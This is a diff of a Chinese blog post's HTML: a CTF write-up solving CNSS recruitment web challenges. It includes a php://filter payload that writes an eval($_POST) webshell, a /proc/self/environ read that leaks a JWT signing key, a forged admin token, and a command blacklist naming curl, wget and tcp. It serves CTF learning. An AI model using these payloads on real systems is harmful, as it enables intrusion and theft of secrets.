 <p>使用工具Githack下载网站/.git下所有内容，注意Githack脚本使用python2编写，两个版本共存的方法是，在正常安装Python3的基础上，再安装Python2，将目录添加至环境变量后，将执行文件名修改为<code>python2.exe</code>，则在pws中输入<code>python</code>是运行python3，输入<code>python2</code>则是运行Python2.</p>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020222625834.png alt=1>
-</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>python2 .<span style=color:#ae81ff>\G</span>itHack.py http:<span style=color:#ae81ff>\\</span>x.x.x<span style=color:#ae81ff>\.</span>git
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020222625834.png" alt="1"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">python2 .<span style="color:#ae81ff">\G</span>itHack.py http:<span style="color:#ae81ff">\\</span>x.x.x<span style="color:#ae81ff">\.</span>git
 </code></pre></div><p>运行后即得到git目录。</p>
-<h3 id=git版本管理>Git版本管理<a hidden class=anchor aria-hidden=true href=#git版本管理>#</a></h3>
+<h3 id="git版本管理">Git版本管理</h3>
 <p>这个地方困扰我很久，但也因此学到了很多之前一直想学但没机会的Git使用方式。</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>git log 
-<span style=color:#75715e># 查看提交记录（版本号）</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">git log 
+<span style="color:#75715e"># 查看提交记录（版本号）</span>
 git status
-<span style=color:#75715e># 查看本地修改记录</span>
+<span style="color:#75715e"># 查看本地修改记录</span>
 git reset --hard 目标版本号
-<span style=color:#75715e># 退回目标版本号</span>
+<span style="color:#75715e"># 退回目标版本号</span>
 git reset HEAD
-<span style=color:#75715e># 回退到最早版本</span>
+<span style="color:#75715e"># 回退到最早版本</span>
 git checkout
-<span style=color:#75715e># 还原与版本记录不符的所有文件</span>
+<span style="color:#75715e"># 还原与版本记录不符的所有文件</span>
 git restore 目标文件名
-<span style=color:#75715e># 还原与版本记录不符的目标文件</span>
+<span style="color:#75715e"># 还原与版本记录不符的目标文件</span>
 </code></pre></div><p>这道题只需要回退到最早版本并checkout，即可得到未修改过的index.html，flag以CNSS{XXX}的形式隐藏在源代码中，注意，要搜<code>CNSS</code>而不是<code>flag</code>。</p>
-<h3 id=其他githack脚本>其他Githack脚本<a hidden class=anchor aria-hidden=true href=#其他githack脚本>#</a></h3>
+<h3 id="其他githack脚本">其他Githack脚本</h3>
 <p>在CTF中推荐<code>Git_Extract-master</code>这个脚本，可以在下载目录的同时，恢复所有文件版本，省去了<code>git reset</code>和<code>git checkout</code>的过程。</p>
-<h2 id=easy更坑的数学题>[😃Easy]更坑的数学题<a hidden class=anchor aria-hidden=true href=#easy更坑的数学题>#</a></h2>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020221052004-16347390601511.png alt=image-20211020221052004>
-</p>
+<h2 id="easy更坑的数学题">[😃Easy]更坑的数学题</h2>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211020221052004-16347390601511.png" alt="image-20211020221052004"></p>
 <p>仅有的提示就是快速把结果提交，有可能会出现flag。</p>
 <p>第一反应是绕过和注入咯，尝试后无果。</p>
 <p>再观察续一秒按钮前端代码，发现是安慰剂按钮。。。</p>
 <p>那就只有在1s内做出答案了，算是个Brute Force吧，下面是丁佬的python代码：</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
-<span style=color:#f92672>import</span> re <span style=color:#75715e># 正则表达式库</span>
-<span style=color:#f92672>import</span> string
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> re <span style="color:#75715e"># 正则表达式库</span>
+<span style="color:#f92672">import</span> string
 
-<span style=color:#f92672>from</span> requests.sessions <span style=color:#f92672>import</span> session
+<span style="color:#f92672">from</span> requests.sessions <span style="color:#f92672">import</span> session
 
-url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;http://81.68.109.40:30005/&#39;</span>
-session <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>session()
-<span style=color:#75715e># 保持会话</span>
-req <span style=color:#f92672>=</span> session<span style=color:#f92672>.</span>get(url<span style=color:#f92672>=</span>url)
-<span style=color:#75715e># 导入URL，创建会话，结果存储在req中</span>
-prog <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>compile(<span style=color:#e6db74>&#39;\d</span><span style=color:#e6db74>{8}</span><span style=color:#e6db74>&#39;</span>)
-<span style=color:#75715e># 初始化正则表达式为匹配连续出现8次的数字</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;http://81.68.109.40:30005/&#39;</span>
+session <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>session()
+<span style="color:#75715e"># 保持会话</span>
+req <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>url)
+<span style="color:#75715e"># 导入URL，创建会话，结果存储在req中</span>
+prog <span style="color:#f92672">=</span> re<span style="color:#f92672">.</span>compile(<span style="color:#e6db74">&#39;\d</span><span style="color:#e6db74">{8}</span><span style="color:#e6db74">&#39;</span>)
+<span style="color:#75715e"># 初始化正则表达式为匹配连续出现8次的数字</span>
 
-group <span style=color:#f92672>=</span> prog<span style=color:#f92672>.</span>findall(req<span style=color:#f92672>.</span>text)
-<span style=color:#75715e># 将结果存入数组</span>
+group <span style="color:#f92672">=</span> prog<span style="color:#f92672">.</span>findall(req<span style="color:#f92672">.</span>text)
+<span style="color:#75715e"># 将结果存入数组</span>
 
-sum <span style=color:#f92672>=</span> int (group[<span style=color:#ae81ff>0</span>])<span style=color:#f92672>*</span>int(group[<span style=color:#ae81ff>1</span>])
-<span style=color:#75715e># 计算结果</span>
-str<span style=color:#f92672>=</span>str(sum)
-data<span style=color:#f92672>=</span>{
-    <span style=color:#e6db74>&#39;res&#39;</span>:str
+sum <span style="color:#f92672">=</span> int (group[<span style="color:#ae81ff">0</span>])<span style="color:#f92672">*</span>int(group[<span style="color:#ae81ff">1</span>])
+<span style="color:#75715e"># 计算结果</span>
+str<span style="color:#f92672">=</span>str(sum)
+data<span style="color:#f92672">=</span>{
+    <span style="color:#e6db74">&#39;res&#39;</span>:str
 }
-<span style=color:#75715e># 构建post的payload</span>
-r<span style=color:#f92672>=</span>session<span style=color:#f92672>.</span>post(url<span style=color:#f92672>=</span>url,data<span style=color:#f92672>=</span>data)
-<span style=color:#75715e># 发送post请求，返回内容存入r中</span>
-print(r<span style=color:#f92672>.</span>text)
+<span style="color:#75715e"># 构建post的payload</span>
+r<span style="color:#f92672">=</span>session<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span>url,data<span style="color:#f92672">=</span>data)
+<span style="color:#75715e"># 发送post请求，返回内容存入r中</span>
+print(r<span style="color:#f92672">.</span>text)
 </code></pre></div><p>这又是一个利用python做题的重要例子，对于python的学习应用要加强，应当抽时间写爬虫实战以练习。</p>
-<h2 id=mid太极掌门人>[😮Mid]太极掌门人<a hidden class=anchor aria-hidden=true href=#mid太极掌门人>#</a></h2>
+<h2 id="mid太极掌门人">[😮Mid]太极掌门人</h2>
 <p>网页给出代码如下：</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-    <span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
-    <span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+    <span style="color:#a6e22e">show_source</span>(<span style="color:#66d9ef">__FILE__</span>);
 
-    <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>deleteDir</span>($path) {
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">deleteDir</span>($path) {
 
-        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_dir</span>($path)) {
-            $dirs <span style=color:#f92672>=</span> <span style=color:#a6e22e>scandir</span>($path);
-            <span style=color:#66d9ef>foreach</span> ($dirs <span style=color:#66d9ef>as</span> $dir) {
-                <span style=color:#66d9ef>if</span> ($dir <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;.&#39;</span> <span style=color:#f92672>&amp;&amp;</span> $dir <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;..&#39;</span>) {
-                    $sonDir <span style=color:#f92672>=</span> $path<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;/&#39;</span><span style=color:#f92672>.</span>$dir;
-                    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>is_dir</span>($sonDir)) {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_dir</span>($path)) {
+            $dirs <span style="color:#f92672">=</span> <span style="color:#a6e22e">scandir</span>($path);
+            <span style="color:#66d9ef">foreach</span> ($dirs <span style="color:#66d9ef">as</span> $dir) {
+                <span style="color:#66d9ef">if</span> ($dir <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;.&#39;</span> <span style="color:#f92672">&amp;&amp;</span> $dir <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;..&#39;</span>) {
+                    $sonDir <span style="color:#f92672">=</span> $path<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span><span style="color:#f92672">.</span>$dir;
+                    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">is_dir</span>($sonDir)) {
 
-                        <span style=color:#a6e22e>deleteDir</span>($sonDir);
+                        <span style="color:#a6e22e">deleteDir</span>($sonDir);
 
-                        <span style=color:#f92672>@</span><span style=color:#a6e22e>rmdir</span>($sonDir);
+                        <span style="color:#f92672">@</span><span style="color:#a6e22e">rmdir</span>($sonDir);
 
-                    } <span style=color:#66d9ef>elseif</span> ($sonDir <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;./index.php&#39;</span>
-                            <span style=color:#f92672>&amp;&amp;</span> $sonDir <span style=color:#f92672>!==</span> <span style=color:#e6db74>&#39;./flag.php&#39;</span>) {
+                    } <span style="color:#66d9ef">elseif</span> ($sonDir <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;./index.php&#39;</span>
+                            <span style="color:#f92672">&amp;&amp;</span> $sonDir <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;./flag.php&#39;</span>) {
 
-                        <span style=color:#f92672>@</span><span style=color:#a6e22e>unlink</span>($sonDir);
+                        <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($sonDir);
 
                     }
                 }
             }
-            <span style=color:#f92672>@</span><span style=color:#a6e22e>rmdir</span>($path);
+            <span style="color:#f92672">@</span><span style="color:#a6e22e">rmdir</span>($path);
         }
     }
 
-    $devil <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&lt;?php exit;?&gt;&#39;</span>;
+    $devil <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?php exit;?&gt;&#39;</span>;
 
-    $goods <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#39;goods&#39;</span>];
+    $goods <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;goods&#39;</span>];
 
-    <span style=color:#a6e22e>file_put_contents</span>($_POST[<span style=color:#e6db74>&#39;train&#39;</span>], $devil <span style=color:#f92672>.</span> $goods);
+    <span style="color:#a6e22e">file_put_contents</span>($_POST[<span style="color:#e6db74">&#39;train&#39;</span>], $devil <span style="color:#f92672">.</span> $goods);
 
-    <span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>1</span>);
+    <span style="color:#a6e22e">sleep</span>(<span style="color:#ae81ff">1</span>);
 
-    <span style=color:#a6e22e>deleteDir</span>(<span style=color:#e6db74>&#39;.&#39;</span>);
+    <span style="color:#a6e22e">deleteDir</span>(<span style="color:#e6db74">&#39;.&#39;</span>);
 
-<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></code></pre></div><p>关键代码：<code>file_put_contents</code>写入文件，妥妥的文件上传漏洞。</p>
 <p>我们构造命令以绕过exit函数，具体参考13.RCE专栏。</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>?</span><span style=color:#a6e22e>train</span><span style=color:#f92672>=</span><span style=color:#a6e22e>php</span><span style=color:#f92672>://</span><span style=color:#a6e22e>filter</span><span style=color:#f92672>/</span><span style=color:#a6e22e>convert</span><span style=color:#f92672>.</span><span style=color:#a6e22e>base64</span><span style=color:#f92672>-</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>/</span><span style=color:#a6e22e>resource</span><span style=color:#f92672>=</span><span style=color:#ae81ff>1.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>goods</span><span style=color:#f92672>=</span><span style=color:#a6e22e>aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw</span><span style=color:#f92672>==</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">?</span><span style="color:#a6e22e">train</span><span style="color:#f92672">=</span><span style="color:#a6e22e">php</span><span style="color:#f92672">://</span><span style="color:#a6e22e">filter</span><span style="color:#f92672">/</span><span style="color:#a6e22e">convert</span><span style="color:#f92672">.</span><span style="color:#a6e22e">base64</span><span style="color:#f92672">-</span><span style="color:#a6e22e">decode</span><span style="color:#f92672">/</span><span style="color:#a6e22e">resource</span><span style="color:#f92672">=</span><span style="color:#ae81ff">1.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">goods</span><span style="color:#f92672">=</span><span style="color:#a6e22e">aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw</span><span style="color:#f92672">==</span>
 </code></pre></div><p>此时PHP执行的命令为：</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#a6e22e>file_put_contents</span>(<span style=color:#e6db74>&#34;php://filter/convert.base64-decode/resource=1.php&#34;</span>, <span style=color:#e6db74>&#39;&lt;?php exit;?&gt;&#39;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==&#34;</span>);
-</code></pre></div><p>我们在PHP中运行一下，发现成功在目录下写入了有命令执行<img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/00E290DA.png alt=img>
-的PHP脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#34;php://filter/convert.base64-decode/resource=1.php&#34;</span>, <span style="color:#e6db74">&#39;&lt;?php exit;?&gt;&#39;</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==&#34;</span>);
+</code></pre></div><p>我们在PHP中运行一下，发现成功在目录下写入了有命令执行<img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/00E290DA.png" alt="img">的PHP脚本。</p>
 <p>由于这是一个静态靶机，为了减轻服务器负担，故而有删除目录命令的存在，定时清空网站根目录，因此我们要在清空之前连入shell脚本，读取flag.php文件内容，拿到flag。</p>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211021205217701.png alt=image-20211021205217701>
-</p>
-<h2 id=midblackpage>[😮Mid]BlackPage<a hidden class=anchor aria-hidden=true href=#midblackpage>#</a></h2>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211021205217701.png" alt="image-20211021205217701"></p>
+<h2 id="midblackpage">[😮Mid]BlackPage</h2>
 <p>查看源代码，发现hint：查看myblackdoor.php</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
-<span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
-<span style=color:#66d9ef>function</span> <span style=color:#a6e22e>blacklist</span>($cmd){
-  $filter <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;(</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&lt;|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>&gt;|Fl4g|php|curl| |0x|</span><span style=color:#ae81ff>\\\\</span><span style=color:#e6db74>|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>$\\</span><span style=color:#e6db74>{IFS</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>}|index|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>*)&#34;</span>;
-  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/&#34;</span><span style=color:#f92672>.</span>$filter<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;/is&#34;</span>,$cmd)<span style=color:#f92672>==</span><span style=color:#ae81ff>1</span>){  
-      <span style=color:#66d9ef>exit</span>(<span style=color:#e6db74>&#39;Go out! This black page does not belong to you!&#39;</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">blacklist</span>($cmd){
+  $filter <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&lt;|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&gt;|Fl4g|php|curl| |0x|</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">$\\</span><span style="color:#e6db74">{IFS</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">}|index|</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">*)&#34;</span>;
+  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>$filter<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/is&#34;</span>,$cmd)<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>){  
+      <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#39;Go out! This black page does not belong to you!&#39;</span>);
   }
-  <span style=color:#66d9ef>else</span>{
-    <span style=color:#a6e22e>system</span>($cmd);
+  <span style="color:#66d9ef">else</span>{
+    <span style="color:#a6e22e">system</span>($cmd);
   }
 }
-<span style=color:#a6e22e>blacklist</span>($_GET[<span style=color:#e6db74>&#39;cmd&#39;</span>]);
-<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
-</span></code></pre></div><h2 id=midto_be_admin>[😮Mid]To_be_Admin<a hidden class=anchor aria-hidden=true href=#midto_be_admin>#</a></h2>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022100859610.png alt=image-20211022100859610>
-</p>
+<span style="color:#a6e22e">blacklist</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><h2 id="midto_be_admin">[😮Mid]To_be_Admin</h2>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022100859610.png" alt="image-20211022100859610"></p>
 <p>页面左下角有/read字样，打开后提示用get参数传入file即可读取指定文件：</p>
 <p>![image-20211022101753988](14.CNSS Recruit-Web Write UP.assets/image-20211022101753988.png)</p>
 <p>尝试后，未发现注入点，直接读取<code>flag.php</code>显示禁止访问，未找到过滤方法。</p>
 <p>我们用burp抓包后发现，网站的cookie可以被读取查看：</p>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022102237323.png alt=image-20211022102237323>
-</p>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022102237323.png" alt="image-20211022102237323"></p>
 <p>应用base64解码后发现文本可读，搜索JWT发现这是一种验证算法。</p>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103012757.png alt=image-20211022103012757>
-</p>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103012757.png" alt="image-20211022103012757"></p>
 <blockquote>
 <p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（<a href="https://link.jianshu.com?t=https://tools.ietf.org/html/rfc7519">(RFC 7519</a>).该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
 </blockquote>
 <p>在JWT.io中可以对其进行详细编辑。jwt分为三部分，头部(header)，载荷(payload)，签名(signature)，签名是根据头部和载荷，加上密钥(key)后按照指定算法生成，如此JWT使用HS256算法。</p>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103113965.png alt=image-20211022103113965>
-</p>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/image-20211022103113965.png" alt="image-20211022103113965"></p>
 <p>在不知道密钥的情况下，我们可以使用JWT cracker暴力破解，我使用java版cracker CPU占用率100%跑了一中午并未出结果，毕竟几率渺茫。</p>
-<p><img loading=lazy src=/14.CNSS%20Recruit-Web%20Write%20UP.assets/4D40723418BF7990649568A57505D53A.jpg alt=img>
-</p>
+<p><img src="/14.CNSS%20Recruit-Web%20Write%20UP.assets/4D40723418BF7990649568A57505D53A.jpg" alt="img"></p>
 <p>正确方法应当是找到网站中隐藏的key。</p>
 <p>我们了解一下proc文件系统：</p>
 <blockquote>
 <p>通过/proc/$pid/来获取指定进程的信息，例如内存映射、CPU绑定信息等等。如果某个进程想要获取本进程的系统信息，就可以通过进程的pid来访问/proc/$pid/目录。但是这个方法还需要获取进程pid，在fork、daemon等情况下pid还可能发生变化。为了更方便的获取本进程的信息，linux提供了/proc/self/目录，这个目录比较独特，不同的进程访问该目录时获得的信息是不同的，内容等价于/proc/本进程pid/。进程可以通过访问/proc/self/目录来获取自己的系统信息，而不用每次都获取pid。</p>
 </blockquote>
 <p>由于此网站后端是用python写的，在生成token时调用的密钥必然存在系统中，我们要做的就是找到并查看系统环境变量：</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>?</span><span style=color:#a6e22e>file</span><span style=color:#f92672>=/</span><span style=color:#a6e22e>proc</span><span style=color:#f92672>/</span><span style=color:#a6e22e>self</span><span style=color:#f92672>/</span><span style=color:#a6e22e>environ</span>
-<span style=color:#75715e># prco是进程目录（linux进程以文件形式存放），self是当前运行进程，environ是环境变量
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">?</span><span style="color:#a6e22e">file</span><span style="color:#f92672">=/</span><span style="color:#a6e22e">proc</span><span style="color:#f92672">/</span><span style="color:#a6e22e">self</span><span style="color:#f92672">/</span><span style="color:#a6e22e">environ</span>
+<span style="color:#75715e"># prco是进程目录（linux进程以文件形式存放），self是当前运行进程，environ是环境变量
 </span></code></pre></div><p>![image-20211022110601481](14.CNSS Recruit-Web Write UP.assets/image-20211022110601481.png)</p>
 <p>在第一行发现密钥KEY：<code>nWMfdan2349r*fn9dMz</code></p>
 <p>这……怎么可能暴力碰出来呢。</p>
 <p>进入jwt.io，修改<code>username=admin</code>，用该密钥生成新的jwt，传入token，放包</p>
-<pre tabindex=0><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIn0.1kMTURzATts34snMro5E2MvNRM46lY0S1Ez4iSmp2_s
+<pre tabindex="0"><code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IkFkbWluIn0.1kMTURzATts34snMro5E2MvNRM46lY0S1Ez4iSmp2_s
 </code></pre><p>拿到flag。</p>
-<h2 id=参考>参考<a hidden class=anchor aria-hidden=true href=#参考>#</a></h2>
-<p>[1] <a href=https://www.runoob.com/regexp/regexp-syntax.html>正则表达式语法-RUNNOOB</a></p>
-<p>[2] <a href=https://www.cnblogs.com/yangshifu/p/9680993.html>Git恢复本地被误删文件</a></p>
-<p>[3] <a href=https://blog.csdn.net/Zero_Adam/article/details/114853022>Proc文件系统详解</a></p>
+<h2 id="参考">参考</h2>
+<p>[1] <a href="https://www.runoob.com/regexp/regexp-syntax.html">正则表达式语法-RUNNOOB</a></p>
+<p>[2] <a href="https://www.cnblogs.com/yangshifu/p/9680993.html">Git恢复本地被误删文件</a></p>
+<p>[3] <a href="https://blog.csdn.net/Zero_Adam/article/details/114853022">Proc文件系统详解</a></p>
+
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">Yiming Shen</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+      2021-10-22
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">License</span>
+    <span class="item-content"><a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank">CC BY-NC-ND 4.0</a></span>
+  </p>
 </div>
-<footer class=post-footer>
-<ul class=post-tags>
-<li><a href=https://shenyimings.github.io/tags/ctf/>CTF</a></li>
-<li><a href=https://shenyimings.github.io/tags/writeup/>WriteUP</a></li>
-<li><a href=https://shenyimings.github.io/tags/note/>Note</a></li>
-</ul>
-<nav class=paginav>
-<a class=prev href=https://shenyimings.github.io/post/15.bugku-sql%E6%B3%A8%E5%85%A5/>
-<span class=title>« Prev Page</span>
-<br>
-<span>Bugku-SQL注入-WriteUP</span>
-</a>
-<a class=next href=https://shenyimings.github.io/post/13.rce%E4%B8%93%E6%A0%8F/>
-<span class=title>Next Page »</span>
-<br>
-<span>RCE 远程命令执行漏洞</span>
-</a>
-</nav>
-<div class=share-buttons>
-<a target=_blank rel="noopener noreferrer" aria-label="share CNSS Recruit-Web Write UP on twitter" href="https://twitter.com/intent/tweet/?text=CNSS%20Recruit-Web%20Write%20UP&url=https%3a%2f%2fshenyimings.github.io%2fpost%2f14.cnss-recruit-web-write-up%2f&hashtags=CTF%2cWriteUP%2cNote"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
-</a>
